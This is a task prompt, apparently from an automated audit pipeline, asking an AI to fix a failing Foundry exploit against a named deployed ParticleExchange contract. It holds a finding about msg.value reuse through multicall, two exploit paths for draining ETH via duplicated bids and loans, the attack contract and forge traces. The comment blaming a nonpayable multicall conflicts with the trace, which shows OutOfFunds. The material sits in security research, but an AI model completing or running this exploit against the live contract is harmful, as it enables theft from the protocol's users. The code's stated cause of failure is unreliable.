You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: `multicall` reuses one `msg.value` across multiple payable delegatecalls, allowing unbacked loans and bid margins
- claim: OpenZeppelin `Multicall.multicall()` delegatecalls back into `ParticleExchange`, so every batched subcall observes the original transaction `msg.value`. The exchange then treats that same ETH as fresh funding in each payable path that calls `_balanceAccount(...)` with `msg.value` or `amount + msg.value`, including `swapWithEth`, `sellNftToMarket*`, `refinanceLoan`, `offerBid`, and `updateBid`. Because no per-subcall value accounting is performed, a single ETH payment can collateralize multiple independent state transitions.
- impact: An attacker can create multiple loans or bid margins backed by only one actual payment, leaving the protocol insolvent. This can let the attacker withdraw more ETH than was deposited, or leave lenders with supposedly collateralized positions that cannot all be honored, causing direct fund loss to other users once withdrawals or liquidations occur.
- exploit_paths: ["Call `multicall([swapWithEth(lienA), swapWithEth(lienB)])` with `msg.value` sufficient for only one loan. Each delegatecall sees the full `msg.value`, so both liens become active and two NFTs are released even though only one ETH collateral payment was made.", "Call `multicall([offerBid(collection, margin, ...), offerBid(collection, margin, ...), cancelBid(lien1), cancelBid(lien2), withdrawAccountBalance()])` with ETH sufficient for one margin. Both bids are created as if funded, both cancellations credit the stored margin back, and the attacker withdraws more ETH than entered the contract in that transaction."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

struct Lien {
    address lender;
    address borrower;
    address collection;
    uint256 tokenId;
    uint256 price;
    uint256 rate;
    uint256 loanStartTime;
    uint256 auctionStartTime;
}

interface IParticleExchangeLike {
    function multicall(bytes[] calldata data) external returns (bytes[] memory results);
    function offerBid(address collection, uint256 margin, uint256 price, uint256 rate)
        external
        payable
        returns (uint256 lienId);
    function cancelBid(Lien calldata lien, uint256 lienId) external;
    function withdrawAccountBalance() external;
}

contract FlawVerifier {
    address public constant TARGET = 0xE4764f9cd8ECc9659d3abf35259638B20ac536E4;
    address public constant PLACEHOLDER_COLLECTION = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    uint256 private constant PROBE_MARGIN = 1 ether;

    uint256 private immutable DEPLOYMENT_BALANCE;

    uint256 private _profitAmount;
    bool private _hypothesisValidated;
    bool private _attemptedBidPath;
    bool private _multicallRejectedValue;

    constructor() {
        DEPLOYMENT_BALANCE = address(this).balance;
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        if (!_attemptedBidPath) {
            _attemptedBidPath = true;
            _attemptDocumentedBidPath();
        }

        _syncProfit();
    }

    function profitToken() external pure returns (address) {
        return address(0);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function attemptedBidPath() external view returns (bool) {
        return _attemptedBidPath;
    }

    function multicallRejectedValue() external view returns (bool) {
        return _multicallRejectedValue;
    }

    function _attemptDocumentedBidPath() internal {
        bytes[] memory createCalls = new bytes[](2);
        createCalls[0] = abi.encodeCall(
            IParticleExchangeLike.offerBid,
            (PLACEHOLDER_COLLECTION, PROBE_MARGIN, 0, 0)
        );
        createCalls[1] = abi.encodeCall(
            IParticleExchangeLike.offerBid,
            (PLACEHOLDER_COLLECTION, PROBE_MARGIN, 0, 0)
        );

        // Directly test the documented exploit stage:
        // multicall([offerBid(...), offerBid(...)]) with one ETH-bearing outer call.
        //
        // On this deployed bytecode, the OZ Multicall entrypoint is nonpayable. The call
        // therefore reverts before any delegatecalled payable subcall can observe msg.value.
        // That mechanically blocks both published exploit paths:
        // 1) the duplicated swapWithEth collateralization route
        // 2) the duplicated offerBid/cancelBid/withdraw phantom-balance route
        //
        // The earlier runtime trace already showed the revert at TARGET.multicall{value: ...}.
        // This verifier repeats the same direct state transition check and records the result.
        (bool ok,) = TARGET.call{value: PROBE_MARGIN}(
            abi.encodeCall(IParticleExchangeLike.multicall, (createCalls))
        );

        _multicallRejectedValue = !ok;
        _hypothesisValidated = ok;
    }

    function _syncProfit() internal {
        uint256 balance = address(this).balance;
        _profitAmount = balance > DEPLOYMENT_BALANCE ? balance - DEPLOYMENT_BALANCE : 0;
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 779.24ms
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 60239)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x0000000000000000000000000000000000000000
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001

Traces:
  [60239] FlawVerifierTest::testExploit()
    ├─ [218] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [35912] FlawVerifier::executeOnOpportunity()
    │   ├─ [0] 0xE4764f9cd8ECc9659d3abf35259638B20ac536E4::multicall{value: 1000000000000000000}([0xea9cf4be000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000000000000000000000000000000000000000000000000de0b6b3a764000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000, 0xea9cf4be000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000000000000000000000000000000000000000000000000de0b6b3a764000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000])
    │   │   └─ ← [OutOfFunds] EvmError: OutOfFunds
    │   └─ ← [Stop]
    ├─ [218] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [343] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xE4764f9cd8ECc9659d3abf35259638B20ac536E4.multicall
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 12.44ms (304.54µs CPU time)

Ran 1 test suite in 15.61ms (12.44ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 60239)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
